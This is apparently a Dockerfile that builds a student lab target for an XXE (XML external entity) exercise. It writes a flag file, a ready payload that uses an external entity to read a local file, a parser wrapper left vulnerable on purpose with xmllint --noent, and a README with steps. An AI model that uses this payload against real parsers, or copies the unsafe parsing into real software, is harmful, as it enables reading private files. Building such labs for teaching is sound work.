# Tier-3 XXE target. Debian-based so students get `apt` (via the internal proxy).
# xmllint resolves external entities (--noent), so a file:// entity reads local files.
FROM debian:12-slim
RUN apt-get update \
 && apt-get install -y --no-install-recommends libxml2-utils \
 && rm -rf /var/lib/apt/lists/*
RUN printf 'Acquire::http::Proxy "http://nielit-apt-proxy:3142";\n' > /etc/apt/apt.conf.d/01proxy \
 && printf 'APT::Install-Recommends "false";\nAPT::Install-Suggests "false";\n' > /etc/apt/apt.conf.d/02lean
RUN useradd -m -s /bin/bash labuser \
 && mkdir -p /challenge \
 && printf 'flag{xxe_external_entity_file_read}\n' > /challenge/flag.txt \
 && printf '<?xml version="1.0"?>\n<!DOCTYPE data [\n  <!ENTITY xxe SYSTEM "file:///challenge/flag.txt">\n]>\n<data>&xxe;</data>\n' > /challenge/payload.xml \
 && printf '#!/bin/sh\n# VULNERABLE: --noent resolves external entities\nxmllint --noent "$1"\n' > /usr/local/bin/parse-xml \
 && chmod 0755 /usr/local/bin/parse-xml /challenge/flag.txt /challenge/payload.xml \
 && printf 'NIELIT XXE target (Kali-style box).\nThe XML parser resolves external entities.\n\nTry:\n  cat /challenge/payload.xml\n  parse-xml /challenge/payload.xml     # entity expansion reads the flag\n  apt install curl                    # you can install tools\n' > /challenge/README
USER labuser
CMD ["sleep", "infinity"]
